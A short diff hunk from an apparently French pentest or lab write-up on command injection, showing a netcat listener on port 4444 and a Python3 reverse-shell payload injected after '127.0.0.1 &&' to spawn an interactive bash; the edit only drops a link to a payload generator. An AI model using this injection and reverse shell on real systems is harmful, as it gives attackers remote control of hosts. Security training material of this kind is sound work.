@@ -135,7 +135,7 @@ nc -lvnp 4444
 - `-p 4444` : port d'écoute
 
 **Étape 2 — Injection du payload :**  
-La redirection Bash `/dev/tcp` étant bloquée par la configuration PHP, j'ai utilisé un payload Python3 généré via [RevShells.com](https://www.revshells.com) — outil standard utilisé en pentest :
+La redirection Bash `/dev/tcp` étant bloquée par la configuration PHP, j'ai utilisé un payload Python3 standard :
 
 ```
 127.0.0.1 && python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
